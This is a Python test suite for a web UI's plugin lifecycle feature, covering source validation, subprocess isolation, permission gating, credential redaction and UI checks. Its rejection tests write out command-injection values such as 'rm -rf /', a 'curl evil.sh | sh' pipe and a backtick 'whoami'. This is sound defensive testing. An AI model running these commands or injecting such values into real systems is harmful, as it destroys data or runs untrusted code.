"""Tests for the Plugin Lifecycle (install/update/remove) settings UI.

Backend: api/plugin_lifecycle.py runs every install/update/remove as an
isolated ``hermes plugins ...`` subprocess (never in-process -- a malicious
or broken plugin must never touch the WebUI server's own memory) +
api/routes.py routes (policy: fail-closed HERMES_WEBUI_ALLOW_PLUGIN_WRITE
gate, standalone-mode 501, single-flight 409). Frontend: panels.js +
index.html + i18n.js additions to the existing Settings -> Plugins pane,
including a double-confirmation modal (source/name + an explicit "executes
third-party code" checkbox) built from scratch because the shared
showConfirmDialog has no checkbox slot.

No real ``hermes`` CLI is ever invoked: every test that exercises the
install/update/remove/list path replaces ``subprocess.run`` with a fake, and
every test that exercises profile/CLI resolution replaces
api.plugin_lifecycle's own bound references to
api.gateway_restart's ``_resolve_hermes_command`` /
``_gateway_restart_profile_context`` (patching the origin module wouldn't
affect plugin_lifecycle's already-imported ``from X import Y`` references).
"""
import ast
import json
import subprocess
import time
from pathlib import Path
from types import SimpleNamespace

import pytest

ROOT = Path(__file__).parent.parent
PANELS_JS = (ROOT / "static" / "panels.js").read_text(encoding="utf-8")
INDEX_HTML = (ROOT / "static" / "index.html").read_text(encoding="utf-8")
I18N_JS = (ROOT / "static" / "i18n.js").read_text(encoding="utf-8")
ROUTES_PY = (ROOT / "api" / "routes.py").read_text(encoding="utf-8")
PLUGIN_LIFECYCLE_PY = (ROOT / "api" / "plugin_lifecycle.py").read_text(encoding="utf-8")


def _fake_proc(returncode=0, stdout="", stderr=""):
    return SimpleNamespace(returncode=returncode, stdout=stdout, stderr=stderr)


class _FakePopen:
    """Stand-in for subprocess.Popen used by start_action()'s _run(), which
    uses Popen+communicate (not subprocess.run) so a timeout can kill the
    whole process group, not just the immediate child (see
    _kill_process_group). ``timeout_first=True`` raises TimeoutExpired on the
    FIRST communicate() call (matching the real timeout path) and returns
    normally on the second (the post-kill reap call)."""

    _next_pid = 9000

    def __init__(self, cmd, *, stdout="", returncode=0, timeout_first=False):
        self.args = cmd
        _FakePopen._next_pid += 1
        self.pid = _FakePopen._next_pid
        self.returncode = returncode
        self._stdout = stdout
        self._timeout_first = timeout_first
        self._communicate_calls = 0

    def communicate(self, timeout=None):
        self._communicate_calls += 1
        if self._timeout_first and self._communicate_calls == 1:
            raise subprocess.TimeoutExpired(cmd=self.args, timeout=timeout)
        return self._stdout, None

    def kill(self):
        pass


def _install_fake_popen(monkeypatch, *, stdout="", returncode=0, timeout_first=False):
    """Patch subprocess.Popen (used by start_action()'s own _run()) with
    _FakePopen, capturing every {cmd,kwargs} call.

    Also patches subprocess.run with a fixed empty-list fake: subprocess.run
    is implemented ON TOP OF subprocess.Popen internally, so patching only
    Popen would ALSO intercept list_installed_plugins()'s `plugins list
    --json` call (start_action()'s own return path calls get_status(), which
    calls list_installed_plugins()) -- and subprocess.run's internal usage
    (context manager, communicate(input=..., timeout=...)) doesn't match
    _FakePopen's shape. Keeping the two calls on separate fakes avoids that
    collision entirely.
    """
    captured = []

    def factory(cmd, **kwargs):
        captured.append({"cmd": cmd, "kwargs": kwargs})
        return _FakePopen(cmd, stdout=stdout, returncode=returncode, timeout_first=timeout_first)

    monkeypatch.setattr(subprocess, "Popen", factory)
    monkeypatch.setattr(subprocess, "run", lambda *a, **k: _fake_proc(0, "[]"))
    return captured


@pytest.fixture
def pl(monkeypatch):
    """api.plugin_lifecycle with CLI resolution pinned to a fake, hermetic environment."""
    from api import plugin_lifecycle as mod

    monkeypatch.setattr(mod, "_resolve_hermes_command", lambda: "/fake/hermes")
    monkeypatch.setattr(mod, "_gateway_restart_profile_context", lambda: (Path("/fake/home"), None))
    # Reset module-level run state so tests don't leak into each other.
    monkeypatch.setattr(mod, "_RUNNING_PROFILES", set(), raising=False)
    monkeypatch.setattr(mod, "_LAST_BY_PROFILE", {}, raising=False)
    return mod


def _wait_until_idle(pl_mod, profile_key="/fake/home", timeout=2.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        with pl_mod._LOCK:
            if profile_key not in pl_mod._RUNNING_PROFILES:
                return
        time.sleep(0.01)
    raise AssertionError("plugin lifecycle action did not finish in time")


LIST_JSON = json.dumps([
    {"name": "bundled-one", "status": "enabled", "version": "1.0", "description": "d", "source": "bundled"},
    {"name": "my-plugin", "status": "enabled", "version": "0.3", "description": "d", "source": "git"},
    {"name": "copied-plugin", "status": "disabled", "version": "", "description": "d", "source": "user"},
])


class TestAvailability:
    def test_available_when_hermes_resolves(self, pl, monkeypatch):
        monkeypatch.setattr(pl, "_resolve_hermes_command_if_real", lambda: "/usr/bin/hermes")
        assert pl.is_available() is True

    def test_unavailable_when_hermes_not_resolvable(self, pl, monkeypatch):
        monkeypatch.setattr(pl, "_resolve_hermes_command_if_real", lambda: None)
        assert pl.is_available() is False


class TestSourceValidation:
    @pytest.mark.parametrize("source", [
        "owner/repo",
        "owner/repo/subdir",
        "https://github.com/owner/repo.git",
    ])
    def test_accepts_safe_sources(self, pl, source):
        assert pl.validate_source(source) == source

    @pytest.mark.parametrize("source,match", [
        ("", "source is required"),
        ("file:///etc/passwd", "https:// URLs or 'owner/repo'"),
        ("http://insecure.example/repo.git", "https:// URLs or 'owner/repo'"),
        ("git@github.com:owner/repo.git", "https:// URLs or 'owner/repo'"),
        ("ssh://git@github.com/owner/repo.git", "https:// URLs or 'owner/repo'"),
        ("owner/../../etc", "Invalid source segment"),
        ("owner/repo; rm -rf /", "Invalid source segment"),
        ("owner/repo && curl evil.sh | sh", "Invalid source segment"),
        ("owner/repo`whoami`", "Invalid source segment"),
        ("just-one-segment", "owner/repo"),
        # A segment starting with '-' is indistinguishable from a CLI flag
        # once it reaches argv (e.g. "-force/repo" as the "owner" segment) --
        # #audit LOW: previously accepted by the old regex.
        ("-owner/repo", "Invalid source segment"),
        ("owner/-repo", "Invalid source segment"),
    ])
    def test_rejects_unsafe_sources(self, pl, source, match):
        with pytest.raises(pl.PluginSourceError, match=match):
            pl.validate_source(source)


class TestPluginNameValidation:
    def test_accepts_name_in_installed_list(self, pl):
        installed = [{"name": "my-plugin"}]
        assert pl.validate_plugin_name("my-plugin", installed) == "my-plugin"

    def test_rejects_traversal(self, pl):
        with pytest.raises(pl.PluginSourceError):
            pl.validate_plugin_name("../../etc", [{"name": "my-plugin"}])

    def test_rejects_slash(self, pl):
        with pytest.raises(pl.PluginSourceError):
            pl.validate_plugin_name("observability/langfuse", [{"name": "observability/langfuse"}])

    def test_rejects_unknown_name(self, pl):
        with pytest.raises(LookupError, match="is not installed"):
            pl.validate_plugin_name("nonexistent", [{"name": "my-plugin"}])

    def test_rejects_leading_hyphen(self, pl):
        """A name starting with '-' could be consumed as a CLI flag instead
        of the positional value it's meant to be -- #audit LOW."""
        with pytest.raises(pl.PluginSourceError):
            pl.validate_plugin_name("-force", [{"name": "-force"}])


class TestListInstalledPlugins:
    def test_parses_cli_json_output(self, pl, monkeypatch):
        monkeypatch.setattr(subprocess, "run", lambda *a, **k: _fake_proc(0, LIST_JSON))
        installed = pl.list_installed_plugins()
        by_name = {p["name"]: p for p in installed}
        assert by_name["bundled-one"]["source"] == "bundled"
        assert by_name["bundled-one"]["enabled"] is True
        assert by_name["copied-plugin"]["enabled"] is False
        assert by_name["my-plugin"]["source"] == "git"

    def test_raises_on_nonzero_exit(self, pl, monkeypatch):
        monkeypatch.setattr(subprocess, "run", lambda *a, **k: _fake_proc(1, "", "boom"))
        with pytest.raises(RuntimeError, match="boom"):
            pl.list_installed_plugins()

    def test_raises_on_unparsable_output(self, pl, monkeypatch):
        monkeypatch.setattr(subprocess, "run", lambda *a, **k: _fake_proc(0, "not json"))
        with pytest.raises(RuntimeError):
            pl.list_installed_plugins()

    def test_raises_on_timeout(self, pl, monkeypatch):
        def _raise(*a, **k):
            raise subprocess.TimeoutExpired(cmd="hermes", timeout=30)
        monkeypatch.setattr(subprocess, "run", _raise)
        with pytest.raises(RuntimeError, match="Failed to list plugins"):
            pl.list_installed_plugins()

    def test_never_invokes_a_shell(self, pl, monkeypatch):
        captured = {}

        def fake_run(cmd, **kwargs):
            captured["cmd"] = cmd
            captured["kwargs"] = kwargs
            return _fake_proc(0, "[]")

        monkeypatch.setattr(subprocess, "run", fake_run)
        pl.list_installed_plugins()
        assert isinstance(captured["cmd"], list)
        assert captured["kwargs"].get("shell") is not True


class TestGetStatus:
    def test_shape_when_available(self, pl, monkeypatch):
        monkeypatch.setattr(pl, "_resolve_hermes_command_if_real", lambda: "/usr/bin/hermes")
        monkeypatch.setattr(subprocess, "run", lambda *a, **k: _fake_proc(0, "[]"))

        status = pl.get_status()

        assert status["available"] is True
        assert status["running"] is False
        assert status["last"] is None
        assert status["installed"] == []

    def test_installed_empty_when_unavailable(self, pl, monkeypatch):
        monkeypatch.setattr(pl, "_resolve_hermes_command_if_real", lambda: None)
        status = pl.get_status()
        assert status["available"] is False
        assert status["installed"] == []

    def test_installed_empty_when_list_fails(self, pl, monkeypatch):
        monkeypatch.setattr(pl, "_resolve_hermes_command_if_real", lambda: "/usr/bin/hermes")
        monkeypatch.setattr(subprocess, "run", lambda *a, **k: _fake_proc(1, "", "broken"))
        status = pl.get_status()
        assert status["available"] is True
        assert status["installed"] == []


class TestStartAction:
    def test_install_success_records_last_result(self, pl, monkeypatch):
        _install_fake_popen(monkeypatch, stdout="Installed my-plugin", returncode=0)

        # The background thread runs a near-instant fake, so whether the
        # returned status snapshot still shows running:True is a genuine
        # race (irrelevant to production behavior) -- only the eventual
        # settled state is asserted here.
        started, _status = pl.start_action("install", "owner/repo", force=False, enable=True)

        assert started is True
        _wait_until_idle(pl)
        final = pl.get_status()
        assert final["running"] is False
        assert final["last"]["action"] == "install"
        assert final["last"]["name"] == "owner/repo"
        assert final["last"]["ok"] is True
        assert "Installed my-plugin" in final["last"]["log_tail"]

    def test_action_failure_recorded(self, pl, monkeypatch):
        _install_fake_popen(monkeypatch, stdout="clone failed", returncode=1)

        pl.start_action("install", "owner/repo")
        _wait_until_idle(pl)

        last = pl.get_status()["last"]
        assert last["ok"] is False
        assert "clone failed" in last["log_tail"]

    def test_timeout_recorded_as_failure_and_kills_process_group(self, pl, monkeypatch):
        """#audit LOW fix: a timeout must kill the whole process group (git/pip/npm
        grandchildren), not just the immediate `hermes` child, and must reap it
        afterward instead of leaving a zombie."""
        _install_fake_popen(monkeypatch, stdout="partial output", returncode=0, timeout_first=True)
        killpg_calls = []
        monkeypatch.setattr(pl.os, "killpg", lambda pgid, sig: killpg_calls.append((pgid, sig)))
        monkeypatch.setattr(pl.os, "getpgid", lambda pid: pid)

        pl.start_action("update", "my-plugin")
        _wait_until_idle(pl)

        last = pl.get_status()["last"]
        assert last["ok"] is False
        assert "Timed out" in last["log_tail"]
        assert "partial output" in last["log_tail"]  # drained after the kill, not discarded
        assert len(killpg_calls) == 1
        assert killpg_calls[0][1] == pl.signal.SIGKILL

    def test_timeout_falls_back_to_proc_kill_when_no_process_groups(self, pl, monkeypatch):
        """Platforms without os.killpg/getpgid (e.g. Windows) must still terminate
        the child instead of erroring out of the timeout handler."""
        monkeypatch.delattr(pl.os, "killpg", raising=False)
        captured = _install_fake_popen(monkeypatch, stdout="", returncode=0, timeout_first=True)

        pl.start_action("install", "owner/repo")
        _wait_until_idle(pl)

        last = pl.get_status()["last"]
        assert last["ok"] is False
        assert len(captured) == 1

    def test_log_tail_bounded(self, pl, monkeypatch):
        huge = "x" * (pl._LOG_TAIL_MAX_BYTES + 5000)
        _install_fake_popen(monkeypatch, stdout=huge, returncode=0)

        pl.start_action("install", "owner/repo")
        _wait_until_idle(pl)

        last = pl.get_status()["last"]
        assert len(last["log_tail"]) <= pl._LOG_TAIL_MAX_BYTES

    def test_single_flight_rejects_concurrent_start_for_same_profile(self, pl, monkeypatch):
        monkeypatch.setattr(pl, "_RUNNING_PROFILES", {"/fake/home"})
        started, status = pl.start_action("install", "owner/repo")
        assert started is False
        assert status["running"] is True

    def test_install_command_includes_force_and_enable_flags(self, pl, monkeypatch):
        # start_action's action subprocess now goes through Popen, while
        # get_status()'s `plugins list --json` still goes through
        # subprocess.run -- the two APIs no longer collide, so (unlike
        # before this fix) there's exactly one Popen call to inspect.
        captured = _install_fake_popen(monkeypatch, stdout="", returncode=0)

        pl.start_action("install", "owner/repo", force=True, enable=False)
        _wait_until_idle(pl)

        assert len(captured) == 1
        cmd = captured[0]["cmd"]
        assert cmd[:3] == ["/fake/hermes", "plugins", "install"]
        assert "owner/repo" in cmd
        assert "--force" in cmd
        assert "--no-enable" in cmd
        assert "--enable" not in cmd
        # Required for _kill_process_group to be able to signal the whole group.
        assert captured[0]["kwargs"].get("start_new_session") is True

    def test_update_and_remove_commands(self, pl, monkeypatch):
        captured = _install_fake_popen(monkeypatch, stdout="", returncode=0)

        pl.start_action("update", "my-plugin")
        _wait_until_idle(pl)
        pl.start_action("remove", "my-plugin")
        _wait_until_idle(pl)

        assert captured[0]["cmd"] == ["/fake/hermes", "plugins", "update", "my-plugin"]
        assert captured[1]["cmd"] == ["/fake/hermes", "plugins", "remove", "my-plugin"]


class TestCredentialRedaction:
    """#audit MEDIUM fix: a credential-bearing install source must never
    appear verbatim in stored/status-visible state."""

    def test_redact_credentials_helper(self, pl):
        assert pl._redact_credentials("https://user:sekret@host/repo.git") == "https://***@host/repo.git"
        assert pl._redact_credentials("no credentials here") == "no credentials here"
        assert pl._redact_credentials("") == ""
        assert pl._redact_credentials(None) == ""

    def test_install_source_with_credentials_is_redacted_in_status(self, pl, monkeypatch):
        source = "https://user:sekret123@example.com/owner/repo.git"
        # validate_source only checks the https:// prefix -- the raw
        # credential-bearing URL passes through unchanged, exactly as
        # start_action() needs it to actually clone.
        assert pl.validate_source(source) == source

        _install_fake_popen(
            monkeypatch,
            stdout=f"Cloning into 'repo'...\nfatal: could not read from remote: {source}",
            returncode=1,
        )

        pl.start_action("install", source)
        _wait_until_idle(pl)

        last = pl.get_status()["last"]
        assert "sekret123" not in last["name"]
        assert "sekret123" not in last["log_tail"]
        assert last["name"] == "https://***@example.com/owner/repo.git"
        assert "https://***@example.com/owner/repo.git" in last["log_tail"]

    def test_plain_shorthand_source_is_unaffected(self, pl, monkeypatch):
        """Redaction must be a no-op for the common case (no '@' present)."""
        _install_fake_popen(monkeypatch, stdout="Installed owner/repo", returncode=0)

        pl.start_action("install", "owner/repo")
        _wait_until_idle(pl)

        last = pl.get_status()["last"]
        assert last["name"] == "owner/repo"


class TestProfileScoping:
    """#audit MEDIUM fix: _RUNNING_PROFILES/_LAST_BY_PROFILE must be keyed per
    profile HERMES_HOME, not process-wide -- otherwise one profile's install
    source/log (including any embedded credentials) leaks into another
    profile's GET /status response."""

    def test_last_result_is_not_visible_from_a_different_profile(self, pl, monkeypatch):
        monkeypatch.setattr(pl, "_gateway_restart_profile_context", lambda: (Path("/profile-a"), None))
        _install_fake_popen(monkeypatch, stdout="done-a", returncode=0)
        pl.start_action("install", "owner/repo-a")
        _wait_until_idle(pl, profile_key="/profile-a")
        assert pl.get_status()["last"]["name"] == "owner/repo-a"

        # Switch the active profile: must see a clean slate, never profile A's result.
        monkeypatch.setattr(pl, "_gateway_restart_profile_context", lambda: (Path("/profile-b"), None))
        status_b = pl.get_status()
        assert status_b["last"] is None
        assert status_b["running"] is False

        # Profile A's own result must still be intact afterward.
        monkeypatch.setattr(pl, "_gateway_restart_profile_context", lambda: (Path("/profile-a"), None))
        assert pl.get_status()["last"]["name"] == "owner/repo-a"

    def test_running_action_in_one_profile_does_not_block_another(self, pl, monkeypatch):
        monkeypatch.setattr(pl, "_RUNNING_PROFILES", {"/profile-a"})
        monkeypatch.setattr(pl, "_gateway_restart_profile_context", lambda: (Path("/profile-b"), None))
        _install_fake_popen(monkeypatch, stdout="", returncode=0)

        started, _status = pl.start_action("install", "owner/repo-b")

        assert started is True
        _wait_until_idle(pl, profile_key="/profile-b")


class TestLockLeakFix:
    """#audit HIGH fix: start_action() must never leave a profile's run slot
    permanently reserved if profile/command resolution fails."""

    def test_profile_resolution_failure_reserves_nothing(self, pl, monkeypatch):
        def _raise():
            raise RuntimeError("profile resolution failed")

        monkeypatch.setattr(pl, "_gateway_restart_profile_context", _raise)

        with pytest.raises(RuntimeError, match="profile resolution failed"):
            pl.start_action("install", "owner/repo")

        assert pl._RUNNING_PROFILES == set()

    def test_command_build_failure_releases_the_reserved_slot(self, pl, monkeypatch):
        real_build = pl._build_action_command
        calls = {"n": 0}

        def _flaky_once(*a, **k):
            calls["n"] += 1
            if calls["n"] == 1:
                raise OSError("disk full")
            return real_build(*a, **k)

        monkeypatch.setattr(pl, "_build_action_command", _flaky_once)
        _install_fake_popen(monkeypatch, stdout="", returncode=0)

        with pytest.raises(OSError, match="disk full"):
            pl.start_action("install", "owner/repo")

        assert pl._RUNNING_PROFILES == set()

        # Regression check: the ORIGINAL bug left the slot permanently
        # reserved, so every subsequent call -- even a perfectly healthy one
        # -- would report started=False forever (409, permanent DoS until a
        # process restart). Confirm that no longer happens.
        started, _status = pl.start_action("install", "owner/repo")
        assert started is True


class TestPluginLifecycleRoutesGating:
    """Route registration + fail-closed gate / standalone / contention behavior."""

    def test_routes_registered(self):
        for marker in (
            '"/api/plugins/lifecycle/status"',
            "/api/plugins/lifecycle/install",
            "/api/plugins/lifecycle/update",
            "/api/plugins/lifecycle/remove",
            "HERMES_WEBUI_ALLOW_PLUGIN_WRITE",
        ):
            assert marker in ROUTES_PY, f"Missing {marker} in routes.py"

    def test_status_route_always_readable_reports_writable_false_when_gated(self, monkeypatch):
        from api import routes

        monkeypatch.delenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", raising=False)
        monkeypatch.setattr(routes, "j", lambda _handler, payload, **_kwargs: payload)
        monkeypatch.setattr(
            "api.plugin_lifecycle.get_status",
            lambda: {"available": True, "running": False, "last": None, "installed": []},
        )

        result = routes.handle_get(object(), SimpleNamespace(path="/api/plugins/lifecycle/status", query=""))

        assert result["writable"] is False

    def test_status_route_reports_writable_true_when_gate_open(self, monkeypatch):
        from api import routes

        monkeypatch.setenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", "1")
        monkeypatch.setattr(routes, "j", lambda _handler, payload, **_kwargs: payload)
        monkeypatch.setattr(
            "api.plugin_lifecycle.get_status",
            lambda: {"available": True, "running": False, "last": None, "installed": []},
        )

        result = routes.handle_get(object(), SimpleNamespace(path="/api/plugins/lifecycle/status", query=""))

        assert result["writable"] is True

    def _post_setup(self, monkeypatch, routes, body):
        monkeypatch.setattr(routes, "_check_csrf", lambda _handler: True)
        monkeypatch.setattr(routes, "_guard_request_session_visibility", lambda *_a, **_k: True)
        monkeypatch.setattr(routes, "_handle_extension_sidecar_proxy", lambda *_a, **_k: False)
        monkeypatch.setattr(routes, "read_body", lambda _handler: body)
        captured = {}
        monkeypatch.setattr(
            routes,
            "j",
            lambda _handler, payload, **kwargs: captured.update(payload=payload, status=kwargs.get("status")) or payload,
        )
        monkeypatch.setattr(
            routes,
            "bad",
            lambda _handler, msg, status=400: captured.update(payload={"ok": False, "error": msg}, status=status)
            or {"ok": False, "error": msg},
        )
        return captured

    @pytest.mark.parametrize("path", [
        "/api/plugins/lifecycle/install",
        "/api/plugins/lifecycle/update",
        "/api/plugins/lifecycle/remove",
    ])
    def test_write_routes_return_403_when_gate_closed(self, monkeypatch, path):
        from api import routes

        monkeypatch.delenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", raising=False)
        captured = self._post_setup(monkeypatch, routes, {"source": "owner/repo", "name": "my-plugin"})

        routes.handle_post(object(), SimpleNamespace(path=path, query=""))

        assert captured["status"] == 403
        assert captured["payload"]["writable"] is False
        assert "HERMES_WEBUI_ALLOW_PLUGIN_WRITE" in captured["payload"]["error"]

    def test_install_route_returns_501_when_unavailable(self, monkeypatch):
        from api import routes

        monkeypatch.setenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", "1")
        monkeypatch.setattr("api.plugin_lifecycle.is_available", lambda: False)
        captured = self._post_setup(monkeypatch, routes, {"source": "owner/repo"})

        routes.handle_post(object(), SimpleNamespace(path="/api/plugins/lifecycle/install", query=""))

        assert captured["status"] == 501
        assert captured["payload"]["writable"] is True

    def test_install_route_rejects_unsafe_source_with_400(self, monkeypatch):
        from api import routes

        monkeypatch.setenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", "1")
        monkeypatch.setattr("api.plugin_lifecycle.is_available", lambda: True)
        captured = self._post_setup(monkeypatch, routes, {"source": "file:///etc/passwd"})

        routes.handle_post(object(), SimpleNamespace(path="/api/plugins/lifecycle/install", query=""))

        assert captured["status"] == 400

    def test_install_route_starts_action_when_gate_open_and_available(self, monkeypatch):
        from api import routes

        monkeypatch.setenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", "1")
        monkeypatch.setattr("api.plugin_lifecycle.is_available", lambda: True)
        monkeypatch.setattr(
            "api.plugin_lifecycle.start_action",
            lambda action, arg, **kw: (True, {"available": True, "running": True, "last": None, "installed": []}),
        )
        captured = self._post_setup(monkeypatch, routes, {"source": "owner/repo"})

        routes.handle_post(object(), SimpleNamespace(path="/api/plugins/lifecycle/install", query=""))

        assert captured["status"] == 200
        assert captured["payload"]["writable"] is True

    def test_install_route_returns_409_when_already_running(self, monkeypatch):
        from api import routes

        monkeypatch.setenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", "1")
        monkeypatch.setattr("api.plugin_lifecycle.is_available", lambda: True)
        monkeypatch.setattr(
            "api.plugin_lifecycle.start_action",
            lambda action, arg, **kw: (False, {"available": True, "running": True, "last": None, "installed": []}),
        )
        captured = self._post_setup(monkeypatch, routes, {"source": "owner/repo"})

        routes.handle_post(object(), SimpleNamespace(path="/api/plugins/lifecycle/install", query=""))

        assert captured["status"] == 409
        assert "already running" in captured["payload"]["error"]

    def test_update_route_returns_404_for_unknown_name(self, monkeypatch):
        from api import routes

        monkeypatch.setenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", "1")
        monkeypatch.setattr("api.plugin_lifecycle.is_available", lambda: True)
        monkeypatch.setattr("api.plugin_lifecycle.list_installed_plugins", lambda: [{"name": "my-plugin"}])
        captured = self._post_setup(monkeypatch, routes, {"name": "nonexistent"})

        routes.handle_post(object(), SimpleNamespace(path="/api/plugins/lifecycle/update", query=""))

        assert captured["status"] == 404

    def test_remove_route_rejects_traversal_name_with_400(self, monkeypatch):
        from api import routes

        monkeypatch.setenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", "1")
        monkeypatch.setattr("api.plugin_lifecycle.is_available", lambda: True)
        monkeypatch.setattr("api.plugin_lifecycle.list_installed_plugins", lambda: [{"name": "my-plugin"}])
        captured = self._post_setup(monkeypatch, routes, {"name": "../../etc"})

        routes.handle_post(object(), SimpleNamespace(path="/api/plugins/lifecycle/remove", query=""))

        assert captured["status"] == 400

    def test_remove_route_starts_action_for_known_name(self, monkeypatch):
        from api import routes

        monkeypatch.setenv("HERMES_WEBUI_ALLOW_PLUGIN_WRITE", "1")
        monkeypatch.setattr("api.plugin_lifecycle.is_available", lambda: True)
        monkeypatch.setattr("api.plugin_lifecycle.list_installed_plugins", lambda: [{"name": "my-plugin"}])
        seen = {}

        def fake_start(action, arg, **kw):
            seen["action"] = action
            seen["arg"] = arg
            return True, {"available": True, "running": True, "last": None, "installed": []}

        monkeypatch.setattr("api.plugin_lifecycle.start_action", fake_start)
        captured = self._post_setup(monkeypatch, routes, {"name": "my-plugin"})

        routes.handle_post(object(), SimpleNamespace(path="/api/plugins/lifecycle/remove", query=""))

        assert captured["status"] == 200
        assert seen == {"action": "remove", "arg": "my-plugin"}


class TestPluginLifecycleModuleDesign:
    """Structural checks that the risky design decisions actually landed in code.

    These parse the AST rather than grepping raw text: the module's own
    docstrings/comments deliberately name ``hermes_cli.plugins_cmd`` and
    ``shell=True`` in prose (explaining what this module *avoids* doing), so
    a naive substring search would false-positive on the explanation itself.
    """

    def test_uses_subprocess_not_in_process_import(self):
        assert "subprocess.run" in PLUGIN_LIFECYCLE_PY
        tree = ast.parse(PLUGIN_LIFECYCLE_PY)
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                assert not any(alias.name.startswith("hermes_cli") for alias in node.names), (
                    "must not import hermes_cli in-process"
                )
            if isinstance(node, ast.ImportFrom):
                assert not (node.module or "").startswith("hermes_cli"), (
                    "must not import from hermes_cli in-process"
                )
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):
                assert node.func.attr != "dashboard_install_plugin"

    def test_never_uses_shell_true(self):
        tree = ast.parse(PLUGIN_LIFECYCLE_PY)
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                for kw in node.keywords:
                    if kw.arg == "shell":
                        is_true = isinstance(kw.value, ast.Constant) and kw.value.value is True
                        assert not is_true, "a subprocess call passes shell=True"

    def test_sets_hermes_home_for_active_profile(self):
        assert "HERMES_HOME" in PLUGIN_LIFECYCLE_PY
        assert "_gateway_restart_profile_context" in PLUGIN_LIFECYCLE_PY


class TestPluginLifecycleHTML:
    def test_markers_exist(self):
        for marker in (
            'id="pluginLifecycleGateNote"',
            'id="pluginLifecycleForm"',
            'id="pluginInstallIdentifier"',
            'id="btnPluginInstall"',
            'id="pluginInstallResult"',
            'id="pluginLifecycleList"',
            'id="pluginLifecycleEmpty"',
        ):
            assert marker in INDEX_HTML, f"Missing {marker} in index.html"

    def test_lifecycle_section_inside_plugins_pane(self):
        pane_start = INDEX_HTML.find('id="settingsPanePlugins"')
        pane_end = INDEX_HTML.find('id="settingsPaneExtensions"')
        lifecycle_idx = INDEX_HTML.find('id="pluginLifecycleForm"')
        assert pane_start >= 0 and pane_end > pane_start
        assert pane_start < lifecycle_idx < pane_end

    def test_meta_text_no_longer_claims_read_only(self):
        pane_start = INDEX_HTML.find('id="settingsPanePlugins"')
        pane_end = INDEX_HTML.find('id="settingsPaneExtensions"')
        segment = INDEX_HTML[pane_start:pane_end]
        assert "read-only" not in segment.lower()


class TestPluginLifecycleJS:
    def test_functions_exist(self):
        for fn in (
            "async function loadPluginLifecyclePanel",
            "function _renderPluginLifecycle",
            "function _buildPluginLifecycleRow",
            "function _bindPluginLifecycleControls",
            "async function _installPluginFromForm",
            "async function _updateInstalledPlugin",
            "async function _removeInstalledPlugin",
            "function _pluginConfirmModal",
        ):
            assert fn in PANELS_JS, f"Missing {fn} in panels.js"

    def test_calls_expected_endpoints(self):
        assert "/api/plugins/lifecycle/status" in PANELS_JS
        assert "/api/plugins/lifecycle/install" in PANELS_JS
        assert "/api/plugins/lifecycle/update" in PANELS_JS
        assert "/api/plugins/lifecycle/remove" in PANELS_JS
        # The old resolve-preview endpoint from an earlier iteration must be gone.
        assert "/api/plugins/resolve" not in PANELS_JS
        assert "/api/plugins/installed" not in PANELS_JS

    def test_confirm_modal_requires_checkbox_before_enabling_confirm(self):
        idx = PANELS_JS.find("function _pluginConfirmModal")
        assert idx >= 0
        body = PANELS_JS[idx:idx + 3500]
        assert "pluginConfirmAck" in body
        assert "okBtn.disabled=true" in body
        assert "ack.onchange" in body
        assert "okBtn.disabled=!ack.checked" in body

    def test_install_update_remove_use_confirm_modal_not_shared_dialog(self):
        for fn_name in ("_installPluginFromForm", "_updateInstalledPlugin", "_removeInstalledPlugin"):
            idx = PANELS_JS.find(f"async function {fn_name}")
            assert idx >= 0
            body = PANELS_JS[idx:idx + 700]
            assert "_pluginConfirmModal" in body, f"{fn_name} must use the double-confirmation modal"

    def test_gate_and_availability_notes_rendered(self):
        idx = PANELS_JS.find("function _renderPluginLifecycleNote")
        assert idx >= 0
        body = PANELS_JS[idx:idx + 700]
        assert "data.available" in body
        assert "data.writable" in body
        assert "settings_plugin_lifecycle_unavailable" in body
        assert "settings_plugin_lifecycle_gate_disabled" in body

    def test_buttons_disabled_when_not_interactive_or_busy(self):
        idx = PANELS_JS.find("function _renderPluginLifecycle(data)")
        assert idx >= 0
        body = PANELS_JS[idx:idx + 900]
        assert "interactive" in body
        assert "busy" in body
        assert "input.disabled=" in body
        assert "installBtn.disabled=" in body

    def test_polls_status_while_running(self):
        idx = PANELS_JS.find("function _syncPluginLifecyclePolling")
        assert idx >= 0
        body = PANELS_JS[idx:idx + 700]
        assert "setInterval(loadPluginLifecyclePanel,2000)" in body
        assert "clearInterval" in body

    def test_load_plugins_panel_gates_tab_hide_on_writable(self):
        idx = PANELS_JS.find("async function loadPluginsPanel")
        assert idx >= 0
        body = PANELS_JS[idx:idx + 1400]
        assert "loadPluginLifecyclePanel" in body
        assert "lifecycleData.writable" in body or ".writable" in body
        assert "data-settings-section=\"plugins\"" in body
        assert ".empty" in body


class TestPluginLifecycleI18n:
    REQUIRED_KEYS = [
        "settings_plugin_lifecycle_title",
        "settings_plugin_lifecycle_desc",
        "settings_plugin_lifecycle_gate_disabled",
        "settings_plugin_lifecycle_unavailable",
        "settings_plugin_install_placeholder",
        "settings_plugin_btn_install",
        "settings_plugin_btn_update",
        "settings_plugin_btn_remove",
        "settings_plugin_installed_title",
        "settings_plugin_installed_empty",
        "settings_plugin_confirm_ack",
        "settings_plugin_confirm_install_title",
        "settings_plugin_confirm_install_msg",
        "settings_plugin_confirm_update_title",
        "settings_plugin_confirm_update_msg",
        "settings_plugin_confirm_remove_title",
        "settings_plugin_confirm_remove_msg",
        "settings_plugin_install_started",
        "settings_plugin_install_failed",
        "settings_plugin_update_started",
        "settings_plugin_update_failed",
        "settings_plugin_remove_started",
        "settings_plugin_remove_failed",
        "settings_plugin_last_action_install",
        "settings_plugin_last_action_update",
        "settings_plugin_last_action_remove",
        "settings_plugin_last_ok",
        "settings_plugin_last_failed",
    ]

    def test_all_keys_present(self):
        for key in self.REQUIRED_KEYS:
            assert key in I18N_JS, f"Missing i18n key '{key}' in i18n.js"

